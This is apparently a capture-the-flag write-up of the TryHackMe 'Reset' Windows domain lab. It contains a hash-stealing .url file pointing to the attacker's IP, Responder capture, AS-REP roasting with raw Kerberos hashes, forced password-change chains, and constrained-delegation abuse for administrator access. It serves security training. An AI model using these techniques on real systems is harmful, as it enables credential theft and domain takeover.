# THM - Reset

#### Ip: 10.10.122.186
#### Name: Reset
#### Rating: Hard

----------------------------------------------------------------------

![reset.png](../assets/reset_assets/reset.png)

Scenario:
```
Step into the shoes of a red teamer in our simulated hack challenge! 
Navigate a realistic organizational environment with up-to-date defenses. 

Test your penetration skills, bypass security measures, and infiltrate into the system. Will you emerge victorious as you simulate the ultimate organization APT?

Find all the flags!
```

--------------------------------------------------------------------


### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I'll also use the `-sC` and `-sV` flags to use basic Nmap scripts and to enumerate versions too.

```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ sudo nmap -p- -sC -sV 10.10.122.186   
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-07 10:15 CST
Nmap scan report for 10.10.122.186
Host is up (0.14s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-07 16:24:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-07T16:24:57+00:00
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2024-01-25T21:01:31
|_Not valid after:  2024-07-26T21:01:31
|_ssl-date: 2024-02-07T16:25:36+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-07T16:24:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 608.53 seconds
```

First things first lets add thm.corp to our `/etc/hosts` file.

Using CrackMapExec I can see we have read/write access to the Data share as guest.

reset_guest_shares.png

Logging in we find a few interesting files:

```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ cat dnlqmakf.lwj.txt        
Subject: Welcome to Reset -�Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team
```

Cool, looks like we've found a credential: ResetMe123!

Also of interest is a PDF on onboarding new employees. Opening it up we find an example template using the letter above, and perhaps a valid username?

reset_pdf.png

Going back to CrackMapExec, we can brute force users using the `--rid-brute` flag:

reset_rid.png

We can also confirm that Lily Oneill was indeed a valid user:
```
THM\LILY_ONEILL (SidTypeUser)
```

Lets add all these usernames to a file called users.txt

### Exploitation

After not getting anywhere trying to spray the discovered password against the users list, I recalled we had both read and write access to the SMB Data share, and wondered if we could possibly capture any NTLM hashes.

To do this I created a file called shell.url:

```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ cat >> shell.url
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.6.61.45\%USERNAME%.icon
IconIndex=1
```

Next I started up a Responder listener on my tun0 interface:

```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ sudo responder -I tun0 
```

Then I used the `put` command to load the malicious shell.url to the onboarding SMB share. 

Within a matter of seconds the AUTOMATE user clicked on my file and I was able to capture their hash:

reset_automate_hash.png

And was able to successfully crack it with John:

reset_johna.png

Armed with the credentials AUTOMATE:Passw0rd1 I was able to use evil-wimrm to logon to the target:

```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ evil-winrm -i thm.corp -u AUTOMATE -p 'Passw0rd1'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\automate\Documents> whoami
thm\automate
*Evil-WinRM* PS C:\Users\automate\Documents> hostname
HayStack
```
And grab the user.txt flag:

reset_user_flag.png

### Privilege Escalation

Having difficulty running enumeration scripts I see that the firewall is on for this target:
```
*Evil-WinRM* PS C:\temp> cmd /c "netsh advfirewall show currentprofile"

Domain Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

After not finding much on the target, I used the AUTOMATE credentials to see if there were and AS-REP roastable accounts:

```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ impacket-GetNPUsers thm.corp/AUTOMATE:Passw0rd1 -request

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Name           MemberOf                                                      PasswordLastSet             LastLogon                   UAC      
-------------  ------------------------------------------------------------  --------------------------  --------------------------  --------
ERNESTO_SILVA  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-07-18 11:21:44.224354  <never>                     0x410200 
TABATHA_BRITT  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-08-21 15:32:59.571306  2023-08-21 15:32:05.792734  0x410200 
LEANN_LONG     CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-07-18 11:21:44.161807  2023-06-16 07:16:11.147334  0x410200 



$krb5asrep$23$ERNESTO_SILVA@THM.CORP:614a0771f99a34651c02e56cbe63866d$c0f1522512a7d6781183a87282d92241d3d4881fcd485e4a4aaf365124469f2eadf2507766c5256edc7a69ae83f598a7b4dcdfd76a9714682f1b7aa481e285697edc6f00d9ffbfb2c4c533334499c9b0d580165d1485edcf4c6a81bc269668e14507a3dab317024c43f1aba49b7b8639c832843f8417d22dce6fe764529286f1222e73b5eb3699835fe0544d01688315f0011a70bdeed7ba1cf8ab081111b8f29895b3f86a247d756bf8d2708a8d7ccde9cf70e6d423b85eef00255d73095c160b29279e759732fac412ab6fe1883305f012f65fe44fbba832cbf597b137af0a0e6ae434
$krb5asrep$23$TABATHA_BRITT@THM.CORP:719864c3078e4556e99da948e898765e$f1bfe1d2aa544b9b846fde482d295c6a7d2c5f302e8ed160f7ad80ffa7cbf8a13e9bf2337ee4662eddbd1430b1bec170d165fd32aa5d5c2fe8cc6a0929c4a3228c2ab7963343b9911116b1fb318c9e8bbf51ba457bfd10a64181ff0aae7489383f8a877ed3589edba69a0344597aff55ed97ce1daf03f9abb7fcaae93c1e6ae17454d81098629165366b4b2fadf9ab155401aa51d75a9ddd7cc8d51e79fcb347c6b09af43e855d797d9fbbc6d928dd6486477c3776b80348221fa8861ec6fc619f79586b91946be3743103fa18f8dadac88f218f42f1a36261eca1aff7cb14a1b832a826
$krb5asrep$23$LEANN_LONG@THM.CORP:4acf56478aa66337560fc52b3a84ad4a$e4e13ecd5c4f89f929087ffd5ef4930aea513029f1989ec7746c8477a17c87df71012218854ca9401691a63739c16a99447311c30246a84e16420a83f0e3d179eff3c84128001c29c5de033161c444b758357620808fd74a5714a35cc379e8df1f1c63f8f35a0e1a601b0b4412cfbbe2d1e83b4d27ef3a8117d868b41e25b91bf60d7693ef2e3cb42d90cfefd87c0a2a9ab0b3dcd1ee05f82f3bcf987792a291cb5996d3a2614526101e83f501e15e4fad45a04eeaf5a24fa52c0328f0042d825d146f8a473fdd58157df4008c066bc207f82b28e38450a082287d2e758cf206331dfebf
```

Throwing these in a file called hash3, I was able to crack TABATHA_BRITT's hash:

reset_john2.png

With this password I can RDP into the target with TABATHA_BRITT:marlboro(1985)

But unfortuantely we still have AV to contend with:

reset_av.png

Manually enumerating the target we can confirm that CELIA_WONG is in the Domain Admins group:

```
PS C:\Users> net user CECILE_WONG
User name                    CECILE_WONG
Full Name                    CECILE_WONG
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/14/2023 7:38:00 AM
Password expires             Never
Password changeable          7/15/2023 7:38:00 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/26/2024 9:20:24 PM

Logon hours allowed          All

Local Group Memberships      *RDS Management Server*Remote Desktop Users
Global Group memberships     *DnsUpdateProxy       *Domain Admins
                             *Gu-gerardway-distlist*Domain Users
The command completed successfully.
```

Not positive where to turn next, I ran bloodhound-python against the domain in hopes getting a visual picture of things may help me move forward:

```
┌──(ryan㉿kali)-[~/THM/Reset/BH]
└─$ bloodhound-python -c All -u 'TABATHA_BRITT' -p 'marlboro(1985)' -d thm.corp -ns 10.10.186.78 --zip
```

Looking through the results under Transative Object Control for TABATHA_BRITT we see that shee has GenericAll contol over SHAWNA_BRAY, who in turn has ForceChangePassword control over CRUZ_HALL, who finally has GenericAll over DARLA_WINTERS.

reset_bloodhound.png

That's a lot off password changing waiting to be done, lets get to it.

reset_net_rpc.png

Now that we've updated these lets confirm we can login to SMB as DARLA_WINTERS:

Nice, it worked:
```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ crackmapexec smb thm.corp -u DARLA_WINTERS -p 'Password789' --shares     
SMB         thm.corp        445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         thm.corp        445    HAYSTACK         [+] thm.corp\DARLA_WINTERS:Password789 
SMB         thm.corp        445    HAYSTACK         [+] Enumerated shares
SMB         thm.corp        445    HAYSTACK         Share           Permissions     Remark
SMB         thm.corp        445    HAYSTACK         -----           -----------     ------
SMB         thm.corp        445    HAYSTACK         ADMIN$                          Remote Admin
SMB         thm.corp        445    HAYSTACK         C$                              Default share
SMB         thm.corp        445    HAYSTACK         Data            READ,WRITE      
SMB         thm.corp        445    HAYSTACK         IPC$            READ            Remote IPC
SMB         thm.corp        445    HAYSTACK         NETLOGON        READ            Logon server share 
SMB         thm.corp        445    HAYSTACK         SYSVOL          READ            Logon server share 
```

If we mark DARLA_WINTERS as 'owned' back in BloodHound, we see she has delegation rights:
```
Allowed To Delegate	cifs/HayStack.thm.corp/thm.corp
cifs/HayStack.thm.corp
cifs/HAYSTACK
cifs/HayStack.thm.corp/THM
cifs/HAYSTACK/THM
```

We can use impacket-getST to exploit this:
```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ impacket-getST -k -impersonate Administrator -spn cifs/HayStack.thm.corp thm.corp/DARLA_WINTERS
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Followed by:
```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ export KRB5CCNAME=Administrator.ccache
```

Once done we can login as the administrator:
```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ impacket-wmiexec -k -no-pass Administrator@Haystack.thm.corp
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm\administrator
```

And grab the final flag:

reset_root.png

Thanks for following along!

-Ryan



